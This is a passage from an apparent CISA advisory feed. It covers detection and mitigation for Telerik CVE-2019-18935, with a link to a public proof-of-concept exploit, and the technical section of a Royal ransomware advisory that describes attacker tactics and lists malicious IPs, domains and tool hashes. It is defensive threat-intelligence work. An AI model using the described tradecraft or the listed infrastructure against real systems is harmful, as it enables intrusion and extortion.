</ul></li>
<li>Filter based on identified timestamps.</li>
<li>Search for new processes created via <code>w3wp.exe</code> in Windows security event logs (e.g., <em>Windows EventID 4688 New Process created</em>).</li>
<li>Search for new PIDs from identified events. Investigate to determine if they spawned any other processes.
<ul><li><em>Example: CMD.EXE launching PowerShell or running other commands such as nslookup or netstat. <strong>Note:</strong> This is not an exhaustive list.</em></li>
</ul></li>
<li>Search for EventID 600 in PowerShell logs.</li>
</ol><h5><em>Trellix XDR Platform Searching</em></h5>
<p>If Trellix XDR Platform is deployed in an environment and a standard HX triage audit is completed in a timely manner of the suspected use of CVE-2019-18935, an organization can search for file write events from known web processes. This will identify the executables written by the web server process. CISA and authoring organizations specifically recommend searching for the following field value pair:</p>
<table class="MsoTableGrid"><caption><em>Table 9: Field Value Pair for Searching</em></caption>
<tbody><tr><th>
<p><strong>Field</strong></p>
</th>
<th>
<p><strong>Value Begins With</strong></p>
</th>
</tr><tr><td>
<p>TextAtLowestOffset</p>
</td>
<td>
<p>MZ</p>
</td>
</tr></tbody></table><h4><strong>MITIGATIONS</strong></h4>
<p><strong>Note:</strong> These mitigations align with the Cross-Sector Cybersecurity Performance Goals (CPGs) developed by CISA and the National Institute of Standards and Technology (NIST). The CPGs provide a minimum set of practices and protections that CISA and NIST recommend all organizations implement. CISA and NIST based the CPGs on existing cybersecurity frameworks and guidance to protect against the most common and impactful threats, tactics, techniques, and procedures. Visit CISA’s <a href="https://www.cisa.gov/cpg" title="Cross-Sector Cybersecurity Performance Goals">Cross-Sector Cybersecurity Performance Goals</a> for more information on the CPGs, including additional recommended baseline protections.</p>
<h5><strong>Manage Vulnerabilities and Configurations</strong></h5>
<ul><li><strong>Upgrade all instances of Telerik UI ASP.NET AJAX to the latest version after appropriate testing.</strong> Keep all software up to date and prioritize patching to <a href="https://www.cisa.gov/known-exploited-vulnerabilities-catalog" title="Known Exploited Vulnerabilities Catalog">known exploited vulnerabilities (KEVs)</a>. [<a href="https://www.cisa.gov/sites/default/files/publications/2022_00092_CISA_CPG_Report_508c.pdf" title="CPG Cross-Sector Cybersecurity Performance Goals 2022">CPG 5.1</a>]</li>
<li><strong>Prioritize remediation of vulnerabilities on internet-facing systems.</strong> For additional guidance, see <a href="https://www.cisa.gov/sites/default/files/publications/CISAInsights-Cyber-RemediateVulnerabilitiesforInternetAccessibleSystems_S508C.pdf" title="Remediate Vulnerabilities for Internet-Accessible Systems">CISA Insights - Remediate Vulnerabilities for Internet-Accessible Systems</a>. [<a href="https://www.cisa.gov/sites/default/files/publications/2022_00092_CISA_CPG_Report_508c.pdf" title="CPG Cross-Sector Cybersecurity Performance Goals 2022">CPG 5.1</a>]</li>
<li><strong>Implement a patch management solution</strong> to ensure compliance with the latest security patches. A patch management solution that inventories all software running in addition to vulnerability scanning is recommended.</li>
<li><strong>Ensure vulnerability scanners are configured to scan a comprehensive scope of devices and locations.</strong> For example, as noted in the Technical Details section, the victim organization had the appropriate plugin for CVE-2019-18935, but the vulnerability went undetected due to the Telerik UI software being installed in a file path not typically scanned. To identify unpatched instances of software vulnerabilities, organizations using vulnerability scanners should be aware that all installations may not be considered “typical” and may require full file scans of web applications.
<ul><li><strong>Note:</strong> Vulnerability scanners may have limitations in detecting vulnerabilities, such as only being able to identify Windows Installer-installed applications, which was the case with this agency’s vulnerability scanner. The Telerik UI software was installed via a continuous integration (CI) and continuous delivery (CD) pipeline rather than the Windows Installer. This highlights the importance of using a comprehensive approach for vulnerability scanning that considers all potential installation methods and file paths.</li>
</ul></li>
<li><strong>Validate output from patch management and vulnerability scanning solutions against running services</strong> to check for discrepancies and account for all services.</li>
</ul><h5> <strong>Segment Networks Based on Function</strong></h5>
<ul><li><strong>Implement network segmentation to separate network segments based on role and functionality.</strong> Proper network segmentation significantly reduces the ability for threat actor lateral movement by controlling traffic flows between—and access to—various subnetworks. (See CISA’s <a href="https://www.cisa.gov/sites/default/files/publications/layering-network-security-segmentation_infographic_508_0.pdf" title="LAYERING NETWORK SECURITY THROUGH SEGMENTATION">Layering Network Security Through Segmentation</a> infographic and the National Security Agency’s <a href="https://media.defense.gov/2019/Sep/09/2002180325/-1/-1/0/Segment%20Networks%20and%20Deploy%20Application%20Aware%20Defenses%20-%20Copy.pdf" title="SEGMENT NETWORKS AND DEPLOY APPLICATION-AWARE DEFENSES">Segment Networks and Deploy Application-Aware Defenses</a>.) [<a href="https://www.cisa.gov/sites/default/files/publications/2022_00092_CISA_CPG_Report_508c.pdf">CPG 8.1</a>]</li>
<li><strong>Isolate similar systems and implement micro-segmentation with granular access and policy restrictions</strong> to modernize cybersecurity and adopt zero trust principles for both network perimeter and internal devices. Logical and physical segmentation are critical to limiting and preventing lateral movement, privilege escalation, and exfiltration. Utilize access control lists (ACLs), hardened firewalls, and network monitoring devices to regulate, monitor, and audit cross-segment access and data transfers.</li>
</ul><h5><strong>Other Best Practice Mitigation Recommendations</strong></h5>
<ul><li><a href="https://www.cisa.gov/sites/default/files/publications/fact-sheet-implementing-phishing-resistant-mfa-508c.pdf" title="Implementing Phishing-Resistant MFA">Implement phishing-resistant multifactor authentication (MFA)</a> for as many services possible—particularly for webmail, virtual private networks (VPNs), accounts that access critical systems, and privileged accounts that manage backups.
<ul><li>MFA can still be leveraged for secure access using a jump server—an asset placed between the external and internal networks that serves as an intermediary for access—to facilitate connections if assets do not have the capability to support MFA implementation.</li>
<li>For additional guidance on secure MFA configurations, visit <a href="http://www.cisa.gov/mfa" title="MFA">cisa.gov/mfa</a>. [<a href="https://www.cisa.gov/sites/default/files/publications/2022_00092_CISA_CPG_Report_508c.pdf" title="CPG Cross-Sector Cybersecurity Performance Goals 2022">CPG 1.3</a>]</li>
</ul></li>
<li><strong>Monitor and analyze activity logs generated from Microsoft IIS and remote PowerShell.</strong> Collect access and security focused logs (IDS/IDPS, firewall, DLP, VPN) and ensure logs are securely stored for a specified duration informed by risk or pertinent regulatory guidance. [<a href="https://www.cisa.gov/sites/default/files/publications/2022_00092_CISA_CPG_Report_508c.pdf" title="CPG Cross-Sector Cybersecurity Performance Goals 2022">CPG 3.1, 3.2</a>]
<ul><li><strong>Evaluate user permissions</strong> and maintain separate user accounts for all actions and activities not associated with the administrator role, e.g., for business email, web browsing, etc. All privileges should be reevaluated on a recurring basis to validate continued need for a given set of permissions. [<a href="https://www.cisa.gov/sites/default/files/publications/2022_00092_CISA_CPG_Report_508c.pdf" title="CPG Cross-Sector Cybersecurity Performance Goals 2022">CPG 1.5</a>]</li>
</ul></li>
<li><strong>Limit service accounts to the minimum permissions necessary to run services.</strong> CISA observed numerous error messages in network logs indicative of failed attempts to write files to additional directories or move laterally.</li>
<li><strong>Maintain a robust asset management policy</strong> through comprehensive documentation of assets, tracking current version information to maintain awareness of outdated software, and mapping assets to business and critical functions.
<ul><li>Determine the need and functionality of assets that require public internet exposure. [<a href="https://www.cisa.gov/sites/default/files/publications/2022_00092_CISA_CPG_Report_508c.pdf" title="CPG Cross-Sector Cybersecurity Performance Goals 2022">CPG 2.3</a>]</li>
</ul></li>
</ul><h4><strong>VALIDATE SECURITY CONTROLS</strong></h4>
<p>In addition to applying mitigations, CISA, FBI, and MS-ISAC recommend exercising, testing, and validating your organization's security program against the threat behaviors mapped to the MITRE ATT&CK for Enterprise framework in this advisory. CISA and co-sealers recommend testing your existing security controls inventory to assess how they perform against the ATT&CK techniques described in this advisory.</p>
<p>To get started:</p>
<ol><li>Select an ATT&CK technique described in this advisory (see Table 4).</li>
<li>Align your security technologies against the selected technique.</li>
<li>Test your technologies against the technique.</li>
<li>Analyze your detection and prevention technologies’ performance.</li>
<li>Repeat the process for all security technologies to obtain a set of comprehensive performance data.</li>
<li>Tune your security program—including people, processes, and technologies—based on the data generated by this process.</li>
</ol><p>CISA, FBI, and MS-ISAC recommend continually testing your security program, at scale, in a production environment to ensure optimal performance against the MITRE ATT&CK techniques identified in this advisory.</p>
<h4><strong>RESOURCES</strong></h4>
<p><a href="https://gchq.github.io/CyberChef/#recipe=From_UNIX_Timestamp('Seconds%20(s)')&input=MTU5NjgzNTMyOQ" title="UNIX Timestamp Converter">UNIX Timestamp Converter</a></p>
<h4><strong>REFERENCES</strong></h4>
<p>[1] <a href="https://docs.telerik.com/devtools/aspnet-ajax/knowledge-base/common-allows-javascriptserializer-deserialization" title="Allows JavaScriptSerializer Deserialization">Telerik: Exploiting .NET JavaScriptSerializer Deserialization (CVE-2019-18935)</a><br />
[2] <a href="https://www.cyber.gov.au/acsc/view-all-content/advisories/advisory-2020-004-remote-code-execution-vulnerability-being-actively-exploited-vulnerable-versions-telerik-ui-sophisticated-actors" title="Advisory 2020-004: Remote code execution vulnerability being actively exploited in vulnerable versions of Telerik UI by sophisticated actors">ACSC Advisory 2020-004</a><br />
[3] <a href="https://bishopfox.com/blog/cve-2019-18935-remote-code-execution-in-telerik-ui" title="CVE-2019-18935: Remote Code Execution via Insecure Deserialization in Telerik UI">Bishop Fox CVE-2019-18935: Remote Code Execution via Insecure Deserialization in Telerik UI</a><br />
[4] <a href="https://www.volexity.com/blog/2021/12/07/xe-group-exposed-8-years-of-hacking-card-skimming-for-profit/" title="XE Group – Exposed: 8 Years of Hacking & Card Skimming for Profit">Volexity Threat Research: XE Group</a><br />
[5] <a href="https://github.com/noperator/CVE-2019-18935/blob/master/CVE-2019-18935.py" title="noperator / CVE-2019-18935">GitHub: Proof-of-Concept Exploit for CVE-2019-18935</a><br />
[6] <a href="https://learn.microsoft.com/en-us/iis/manage/provisioning-and-managing-iis/configure-logging-in-iis" title="Configure Logging in IIS">Microsoft: Configure Logging in IIS</a><br />
[7] <a href="https://github.com/noperator/CVE-2019-18935" title="noperator / CVE-2019-18935">GitHub: CVE-2019-18935</a></p>
<h4><strong>ACKNOWLEDGEMENTS</strong></h4>
<p>Google’s Threat Analysis Group (TAG) contributed to this CSA.</p>
<p>Please share your thoughts. We recently updated our anonymous <a href="https://www.surveymonkey.com/r/CISA-cyber-survey?product=%5bproduct_value%5d" title="Survey">Product Feedback</a> Survey and we'd welcome your feedback.</p>

## pubDate
Mon, 13 Mar 2023 13:57:57 EDT
## dc:creator
CISA
## guid
## @isPermaLink
false
## #text
/node/17602
## -
## title
#StopRansomware: Royal Ransomware
## link
https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-061a
## description
<h4><strong>SUMMARY</strong></h4>
<p><em><strong>Note:</strong> This joint Cybersecurity Advisory (CSA) is part of an ongoing <a href="https://www.cisa.gov/stopransomware" title="#StopRansomware">#StopRansomware</a> effort to publish advisories for network defenders that detail various ransomware variants and ransomware threat actors. These #StopRansomware advisories include recently and historically observed tactics, techniques, and procedures (TTPs) and indicators of compromise (IOCs) to help organizations protect against ransomware. Visit <a href="https://www.cisa.gov/stopransomware" title="#StopRansomware">stopransomware.gov</a> to see all #StopRansomware advisories and to learn more about other ransomware threats and no-cost resources.</em></p>
<p><strong>Actions to take today to mitigate cyber threats from ransomware:</strong></p>
<ul><li>Prioritize remediating <a href="https://www.cisa.gov/known-exploited-vulnerabilities-catalog">known exploited vulnerabilities</a>.</li>
<li>Train users to recognize and report <a href="https://www.cisa.gov/phishing-infographic">phishing attempts</a>.</li>
<li>Enable and enforce <a href="https://www.cisa.gov/mfa">multifactor authentication</a>.</li>
</ul><p>The Federal Bureau of Investigation (FBI) and the Cybersecurity and Infrastructure Security Agency (CISA) are releasing this joint CSA to disseminate known Royal ransomware IOCs and TTPs identified through FBI threat response activities as recently as January 2023.</p>
<p>Since approximately September 2022, cyber criminals have compromised U.S. and international organizations with a Royal ransomware variant. FBI and CISA believe this variant, which uses its own custom-made file encryption program, evolved from earlier iterations that used “Zeon” as a loader. After gaining access to victims’ networks, Royal actors disable antivirus software and exfiltrate large amounts of data before ultimately deploying the ransomware and encrypting the systems. Royal actors have made ransom demands ranging from approximately $1 million to $11 million USD in Bitcoin. In observed incidents, Royal actors do not include ransom amounts and payment instructions as part of the initial ransom note. Instead, the note, which appears after encryption, requires victims to directly interact with the threat actor via a <code>.onion</code> URL (reachable through the <a href="https://cisa.gov/uscert/ncas/alerts/aa20-183a" title="Defending Against Malicious Cyber Activity Originating from Tor">Tor browser</a>). Royal actors have targeted numerous <a href="https://www.cisa.gov/topics/critical-infrastructure-security-and-resilience/critical-infrastructure-sectors" title="Critical Infrastructure Sectors">critical infrastructure sectors</a> including, but not limited to, Manufacturing, Communications, Healthcare and Public Healthcare (HPH), and Education.</p>
<p>FBI and CISA encourage organizations to implement the recommendations in the Mitigations section of this CSA to reduce the likelihood and impact of ransomware incidents.</p>
<p>Download the PDF version of this report:</p>



<div class="align-center c-file">
    <div class="c-file__download">
    <a href="https://www.cisa.gov/sites/default/files/2023-03/aa23-061a-stopransomware-royal-ransomware_0.pdf" class="c-file__link" target="_blank">#StopRansomware: Royal Ransomware</a>
    <span class="c-file__size">(PDF,       586.96 KB
  )</span>
  </div>
</div>
<p>For a downloadable copy of IOCs, see</p>



<div class="align-center c-file">
    <div class="c-file__download">
    <a href="https://www.cisa.gov/sites/default/files/2023-03/aa23-061a.stix__0.xml" class="c-file__link" target="_blank">AA23-061A STIX XML</a>
    <span class="c-file__size">(XML,       114.26 KB
  )</span>
  </div>
</div>
<h4><strong>TECHNICAL DETAILS</strong></h4>
<p><em><strong>Note: </strong>This advisory uses the MITRE ATT&CK® for Enterprise framework, version 12. <a href="https://attack.mitre.org/versions/v11/matrices/enterprise/" title="Enterprise Matrix">See MITRE ATT&CK for Enterprise</a> for all referenced tactics and techniques.</em></p>
<p>Royal ransomware uses a unique partial encryption approach that allows the threat actor to choose a specific percentage of data in a file to encrypt. This approach allows the actor to lower the encryption percentage for larger files, which helps evade detection.[<a href="https://www.cybereason.com/blog/royal-ransomware-analysis" title="Royal Rumble: Analysis of Royal Ransomware">1</a>] In addition to encrypting files, Royal actors also engage in double extortion tactics in which they threaten to publicly release the encrypted data if the victim does not pay the ransom.</p>
<h5><strong>Initial Access</strong></h5>
<p>Royal actors gain initial access to victim networks in a number of ways including: </p>
<ul><li><strong>Phishing.</strong> According to third-party reporting, Royal actors most commonly (in 66.7% of incidents) gain initial access to victim networks via successful phishing emails [<a href="https://attack.mitre.org/versions/v12/techniques/T1566/" title="Phishing">T1566</a>].
<ul><li>According to open-source reporting, victims have unknowingly installed malware that delivers Royal ransomware after receiving phishing emails containing malicious PDF documents [<a href="https://attack.mitre.org/versions/v12/techniques/T1566/001/" title="Phishing: Spearphishing Attachment">T1566.001</a>], and malvertising [<a href="https://attack.mitre.org/versions/v12/techniques/T1566/002/" title="Phishing: Spearphishing Link">T1566.002</a>].[<a href="https://www.microsoft.com/en-us/security/blog/2022/11/17/dev-0569-finds-new-ways-to-deliver-royal-ransomware-various-payloads/" title="DEV-0569 finds new ways to deliver Royal ransomware, various payloads">2</a>]</li>
</ul></li>
<li><strong>Remote Desktop Protocol (RDP). </strong>The second most common vector Royal actors use (in 13.3% of incidents) for initial access is RDP compromise.  </li>
<li><strong>Public-facing applications.</strong> FBI has also observed Royal actors gain initial access through exploiting public-facing applications [<a href="https://attack.mitre.org/versions/v12/techniques/T1190/" title="Exploit Public-Facing Application">T1190</a>]. </li>
<li><strong>Brokers. </strong>Reports from trusted third-party sources indicate that Royal actors may leverage brokers to gain initial access and source traffic by harvesting virtual private network (VPN) credentials from stealer logs. </li>
</ul><h5><strong>Command and Control</strong></h5>
<p>Once Royal actors gain access to the network, they communicate with command and control (C2) infrastructure and download multiple tools [<a href="https://attack.mitre.org/versions/v12/techniques/T1105/" title="Ingress Tool Transfer">T1105</a>]. Legitimate Windows software is repurposed by Royal operators to strengthen their foothold in the victim’s network. Ransomware operators often use open-source projects to aid their intrusion activities; Royal operators have recently been observed using <code>Chisel</code>, a tunneling tool transported over HTTP and secured via SSH [<a href="https://attack.mitre.org/versions/v12/techniques/T1572/" title="Protocol Tunneling">T1572</a>], to communicate with their C2 infrastructure. FBI has observed multiple Qakbot C2s used in Royal ransomware attacks, but has not yet determined if Royal ransomware exclusively uses Qakbot C2s.</p>
<h5><strong>Lateral Movement and Persistence</strong></h5>
<p>Royal actors often use RDP to move laterally across the network [<a href="https://attack.mitre.org/versions/v12/techniques/T1021/001/" title="Remote Services: Remote Desktop Protocol">T1021.001</a>]. Microsoft Sysinternals tool <code>PsExec</code> has also been used to aid lateral movement. FBI has observed Royal actors using remote monitoring and management (RMM) software, such as AnyDesk, LogMeIn, and Atera, for persistence in the victim’s network [<a href="https://attack.mitre.org/versions/v12/techniques/T1133/" title="External Remote Services">T1133</a>]. In some instances, the actors moved laterally to the domain controller. In one confirmed case, the actors used a legitimate admin account to remotely log on to the domain controller [<a href="https://attack.mitre.org/versions/v12/techniques/T1078" title="Valid Accounts">T1078</a>]. Once on the domain controller, the threat actor deactivated antivirus protocols [<a href="https://attack.mitre.org/versions/v12/techniques/T1562/001/" title="Impair Defenses: Disable or Modify Tools">T1562.001</a>] by modifying Group Policy Objects [<a href="https://attack.mitre.org/versions/v12/techniques/T1484/001/" title="Domain Policy Modification: Group Policy Modification">T1484.001</a>].</p>
<h5><strong>Exfiltration</strong></h5>
<p>Royal actors exfiltrate data from victim networks by repurposing legitimate cyber pentesting tools, such as Cobalt Strike, and malware tools and derivatives, such as Ursnif/Gozi, for data aggregation and exfiltration. According to third-party reporting, Royal actors’ first hop in exfiltration and other operations is usually a U.S. IP address.</p>
<p><em>Note: In reference to Cobalt Strike and other tools mentioned above, a tool repository used by Royal was identified at IP: 94.232.41[.]105 in December 2022.</em></p>
<h5><strong>Encryption</strong></h5>
<p>Before starting the encryption process, Royal actors: </p>
<ul><li>Use Windows Restart Manager to determine whether targeted files are currently in use or blocked by other applications [<a href="https://attack.mitre.org/versions/v12/techniques/T1486/">T1486</a>].[<a href="https://www.cybereason.com/blog/royal-ransomware-analysis">1</a>] </li>
<li>Use Windows Volume Shadow Copy service (<code>vssadmin.exe</code>) to delete shadow copies to prevent system recovery.[<a href="https://www.cybereason.com/blog/royal-ransomware-analysis">1</a>]  </li>
</ul><p>FBI has found numerous batch (<code>.bat</code>) files on impacted systems which are typically transferred as an encrypted 7zip file. Batch files create a new admin user [<a href="https://attack.mitre.org/versions/v12/techniques/T1078/002/" title="Valid Accounts: Domain Accounts">T1078.002</a>], force a group policy update, set pertinent registry keys to auto-extract [<a href="https://attack.mitre.org/versions/v12/techniques/T1119/" title="Automated Collection">T1119</a>] and execute the ransomware, monitor the encryption process, and delete files upon completion—including Application, System, and Security event logs [<a href="https://attack.mitre.org/versions/v12/techniques/T1070/001/" title="Indicator Removal: Clear Windows Event Logs">T1070.001</a>].</p>
<p>Malicious files have been found in victim networks in the following directories:</p>
<ul><li><code>C:\Temp\  </code></li>
<li><code>C:\Users\<user>\AppData\Roaming\  </code></li>
<li><code>C:\Users\<users>\ </code></li>
<li><code>C:\ProgramData\</code></li>
</ul><h5><strong>Indicators of Compromise (IOC)</strong></h5>
<p>See table 1 and 2 for Royal ransomware IOCs that FBI obtained during threat response activities as of January 2023. <strong>Note:</strong> Some of the observed IP addresses are several months old. FBI and CISA recommend vetting or investigating these IP addresses prior to taking forward-looking action, such as blocking.</p>
<table class="MsoTableGrid"><caption><em>Table 1: Royal Ransomware Associated Files, Hashes, and IP addresses as of January 2023</em></caption>
<tbody><tr><th>
<p><strong>IOC</strong></p>
</th>
<th>
<p><strong>Description</strong></p>
</th>
</tr><tr><td>
<p>.royal</p>
</td>
<td>
<p>Encrypted file extension</p>
</td>
</tr><tr><td>
<p>README.TXT</p>
</td>
<td>
<p>Ransom note</p>
</td>
</tr><tr><th>
<p><strong>Malicious IP</strong></p>
</th>
<th>
<p><strong>Last Activity</strong></p>
</th>
</tr><tr><td>
<p>102.157.44[.]105</p>
</td>
<td>
<p>November 2022</p>
</td>
</tr><tr><td>
<p>105.158.118[.]241</p>
</td>
<td>
<p>November 2022</p>
</td>
</tr><tr><td>
<p>105.69.155[.]85</p>
</td>
<td>
<p>November 2022</p>
</td>
</tr><tr><td>
<p>113.169.187[.]159</p>
</td>
<td>
<p>November 2022</p>
</td>
</tr><tr><td>
<p>134.35.9[.]209</p>
</td>
<td>
<p>November 2022</p>
</td>
</tr><tr><td>
<p>139.195.43[.]166</p>
</td>
<td>
<p>November 2022</p>
</td>
</tr><tr><td>
<p>139.60.161[.]213</p>
</td>
<td>
<p>November 2022</p>
</td>
</tr><tr><td>
<p>148.213.109[.]165</p>
</td>
<td>
<p>November 2022</p>
</td>
</tr><tr><td>
<p>163.182.177[.]80</p>
</td>
<td>
<p>November 2022</p>
</td>
</tr><tr><td>
<p>181.141.3[.]126</p>
</td>
<td>
<p>November 2022</p>
</td>
</tr><tr><td>
<p>181.164.194[.]228</p>
</td>
<td>
<p>November 2022</p>
</td>
</tr><tr><td>
<p>185.143.223[.]69</p>
</td>
<td>
<p>November 2022</p>
</td>
</tr><tr><td>
<p>186.64.67[.]6</p>
</td>
<td>
<p>November 2022</p>
</td>
</tr><tr><td>
<p>186.86.212[.]138</p>
</td>
<td>
<p>November 2022</p>
</td>
</tr><tr><td>
<p>190.193.180[.]228</p>
</td>
<td>
<p>November 2022</p>
</td>
</tr><tr><td>
<p>196.70.77[.]11</p>
</td>
<td>
<p>November 2022</p>
</td>
</tr><tr><td>
<p>197.11.134[.]255</p>
</td>
<td>
<p>November 2022</p>
</td>
</tr><tr><td>
<p>197.158.89[.]85</p>
</td>
<td>
<p>November 2022</p>
</td>
</tr><tr><td>
<p>197.204.247[.]7</p>
</td>
<td>
<p>November 2022</p>
</td>
</tr><tr><td>
<p>197.207.181[.]147</p>
</td>
<td>
<p>November 2022</p>
</td>
</tr><tr><td>
<p>197.207.218[.]27</p>
</td>
<td>
<p>November 2022</p>
</td>
</tr><tr><td>
<p>197.94.67[.]207</p>
</td>
<td>
<p>November 2022</p>
</td>
</tr><tr><td>
<p>23.111.114[.]52</p>
</td>
<td>
<p>November 2022</p>
</td>
</tr><tr><td>
<p>41.100.55[.]97</p>
</td>
<td>
<p>November 2022</p>
</td>
</tr><tr><td>
<p>41.107.77[.]67</p>
</td>
<td>
<p>November 2022</p>
</td>
</tr><tr><td>
<p>41.109.11[.]80</p>
</td>
<td>
<p>November 2022</p>
</td>
</tr><tr><td>
<p>41.251.121[.]35</p>
</td>
<td>
<p>November 2022</p>
</td>
</tr><tr><td>
<p>41.97.65[.]51</p>
</td>
<td>
<p>November 2022</p>
</td>
</tr><tr><td>
<p>42.189.12[.]36</p>
</td>
<td>
<p>November 2022</p>
</td>
</tr><tr><td>
<p>45.227.251[.]167</p>
</td>
<td>
<p>November 2022</p>
</td>
</tr><tr><td>
<p>5.44.42[.]20</p>
</td>
<td>
<p>November 2022</p>
</td>
</tr><tr><td>
<p>61.166.221[.]46</p>
</td>
<td>
<p>November 2022</p>
</td>
</tr><tr><td>
<p>68.83.169[.]91</p>
</td>
<td>
<p>November 2022</p>
</td>
</tr><tr><td>
<p>81.184.181[.]215</p>
</td>
<td>
<p>November 2022</p>
</td>
</tr><tr><td>
<p>82.12.196[.]197</p>
</td>
<td>
<p>November 2022</p>
</td>
</tr><tr><td>
<p>98.143.70[.]147</p>
</td>
<td>
<p>November 2022</p>
</td>
</tr><tr><td>
<p>140.82.48[.]158</p>
</td>
<td>
<p>December 2022</p>
</td>
</tr><tr><td>
<p>147.135.36[.]162</p>
</td>
<td>
<p>December 2022</p>
</td>
</tr><tr><td>
<p>147.135.11[.]223</p>
</td>
<td>
<p>December 2022</p>
</td>
</tr><tr><td>
<p>152.89.247[.]50</p>
</td>
<td>
<p>December 2022</p>
</td>
</tr><tr><td>
<p>179.43.167[.]10</p>
</td>
<td>
<p>December 2022</p>
</td>
</tr><tr><td>
<p>185.7.214[.]218</p>
</td>
<td>
<p>December 2022</p>
</td>
</tr><tr><td>
<p>193.149.176[.]157</p>
</td>
<td>
<p>December 2022</p>
</td>
</tr><tr><td>
<p>193.235.146[.]104</p>
</td>
<td>
<p>December 2022</p>
</td>
</tr><tr><td>
<p>209.141.36[.]116</p>
</td>
<td>
<p>December 2022</p>
</td>
</tr><tr><td>
<p>45.61.136[.]47</p>
</td>
<td>
<p>December 2022</p>
</td>
</tr><tr><td>
<p>45.8.158[.]104</p>
</td>
<td>
<p>December 2022</p>
</td>
</tr><tr><td>
<p>5.181.234[.]58</p>
</td>
<td>
<p>December 2022</p>
</td>
</tr><tr><td>
<p>5.188.86[.]195</p>
</td>
<td>
<p>December 2022</p>
</td>
</tr><tr><td>
<p>77.73.133[.]84</p>
</td>
<td>
<p>December 2022</p>
</td>
</tr><tr><td>
<p>89.108.65[.]136</p>
</td>
<td>
<p>December 2022</p>
</td>
</tr><tr><td>
<p>94.232.41[.]105</p>
</td>
<td>
<p>December 2022</p>
</td>
</tr><tr><td>
<p>47.87.229[.]39</p>
</td>
<td>
<p>January 2023</p>
</td>
</tr><tr><th>
<p><strong>Malicious Domain</strong></p>
</th>
<th>
<p><strong>Last Observed</strong></p>
</th>
</tr><tr><td>
<p>ciborkumari[.]xyz</p>
</td>
<td>
<p>October 2022</p>
</td>
</tr><tr><td>
<p>sombrat[.]com</p>
</td>
<td>
<p>October 2022</p>
</td>
</tr><tr><td>
<p>gororama[.]com</p>
</td>
<td>
<p>November 2022</p>
</td>
</tr><tr><td>
<p>softeruplive[.]com</p>
</td>
<td>
<p>November 2022</p>
</td>
</tr><tr><td>
<p>altocloudzone[.]live</p>
</td>
<td>
<p>December 2022</p>
</td>
</tr><tr><td>
<p>ciborkumari[.]xyz</p>
</td>
<td>
<p>December 2022</p>
</td>
</tr><tr><td>
<p>myappearinc[.]com</p>
</td>
<td>
<p>December 2022</p>
</td>
</tr><tr><td>
<p>parkerpublic[.]com</p>
</td>
<td>
<p>December 2022</p>
</td>
</tr><tr><td>
<p>pastebin.mozilla[.]org/Z54Vudf9/raw</p>
</td>
<td>
<p>December 2022</p>
</td>
</tr><tr><td>
<p>tumbleproperty[.]com</p>
</td>
<td>
<p>December 2022</p>
</td>
</tr><tr><td>
<p>myappearinc[.]com/acquire/draft/c7lh0s5jv</p>
</td>
<td>
<p>January 2023</p>
</td>
</tr></tbody></table><table class="MsoTableGrid"><caption><em>Table 2: Tools used by Royal operators</em></caption>
<tbody><tr><th>
<p><strong>Tool</strong></p>
</th>
<th>
<p><strong>SHA256</strong></p>
</th>
</tr><tr><td>
<p>AV tamper</p>
</td>
<td>
<p>8A983042278BC5897DBCDD54D1D7E3143F8B7EAD553B5A4713E30DEFFDA16375</p>
</td>
</tr><tr><td>
<p>TCP/UDP Tunnel over HTTP (Chisel)</p>
</td>
<td>
<p>8a99353662ccae117d2bb22efd8c43d7169060450be413af763e8ad7522d2451</p>
</td>
</tr><tr><td>
<p>Ursnif/Gozi</p>
</td>
<td>
<p>be030e685536eb38ba1fec1c90e90a4165f6641c8dc39291db1d23f4ee9fa0b1</p>
</td>
</tr><tr><td>
<p>Exfil</p>
</td>
<td>
<p>B8C4AEC31C134ADBDBE8AAD65D2BCB21CFE62D299696A23ADD9AA1DE082C6E20</p>
</td>
</tr><tr><td>
<p>Remote Access (AnyDesk)</p>
</td>
<td>
<p>4a9dde3979c2343c024c6eeeddff7639be301826dd637c006074e04a1e4e9fe7</p>
</td>
</tr><tr><td>
<p>PowerShell Toolkit Downloader</p>
</td>
<td>
<p>4cd00234b18e04dcd745cc81bb928c8451f6601affb5fa45f20bb11bfb5383ce</p>
</td>
</tr><tr><td>
<p>PsExec (Microsoft Sysinternals)</p>
</td>
<td>
<p>08c6e20b1785d4ec4e3f9956931d992377963580b4b2c6579fd9930e08882b1c</p>
</td>
</tr><tr><td>
<p>Keep Host Unlocked (Don’t Sleep)</p>
</td>
<td>
<p>f8cff7082a936912baf2124d42ed82403c75c87cb160553a7df862f8d81809ee</p>
</td>
</tr><tr><td>
<p>Ransomware Executable</p>
</td>
<td>
<p>d47d4b52e75e8cf3b11ea171163a66c06d1792227c1cf7ca49d7df60804a1681</p>
</td>
</tr><tr><td>
<p>Windows Command Line (NirCmd)</p>
</td>
<td>
<p>216047C048BF1DCBF031CF24BD5E0F263994A5DF60B23089E393033D17257CB5</p>
</td>
</tr><tr><td>
<p>System Management (NSudo)</p>
</td>
<td>
<p>19896A23D7B054625C2F6B1EE1551A0DA68AD25CDDBB24510A3B74578418E618</p>
</td>
</tr><tr><th>
<p><strong>Batch Scripts</strong></p>
</th>
<th> </th>
</tr><tr><td>
<p><strong>Filename</strong></p>
</td>
<td>
<p><strong>Hash Value</strong></p>
</td>
</tr><tr><td>
<p>2.bat</p>
</td>
<td>
<p>585b05b290d241a249af93b1896a9474128da969</p>
</td>
</tr><tr><td>
<p>3.bat</p>
</td>
<td>
<p>41a79f83f8b00ac7a9dd06e1e225d64d95d29b1d</p>
</td>
</tr><tr><td>
<p>4.bat</p>
</td>
<td>
<p>a84ed0f3c46b01d66510ccc9b1fc1e07af005c60</p>
</td>
</tr><tr><td>
<p>8.bat</p>
</td>
<td>
<p>c96154690f60a8e1f2271242e458029014ffe30a</p>
</td>
</tr><tr><td>
<p>kl.bat</p>
</td>
<td>
<p>65dc04f3f75deb3b287cca3138d9d0ec36b8bea0</p>
</td>
</tr><tr><td>
<p>gp.bat</p>
</td>
<td>
<p>82f1f72f4b1bfd7cc8afbe6d170686b1066049bc7e5863b51aa15ccc5c841f58</p>
</td>
</tr><tr><td>
<p>r.bat</p>
</td>
<td>
<p>74d81ef0be02899a177d7ff6374d699b634c70275b3292dbc67e577b5f6a3f3c</p>
</td>
</tr><tr><td>
<p>runanddelete.bat</p>
</td>
<td>
<p>342B398647073159DFA8A7D36510171F731B760089A546E96FBB8A292791EFEE</p>
</td>
</tr></tbody></table><h4><strong>MITRE ATT&CK TECHNIQUES</strong></h4>
<p>See table 3 for all referenced threat actor tactics and techniques included in this advisory.</p>
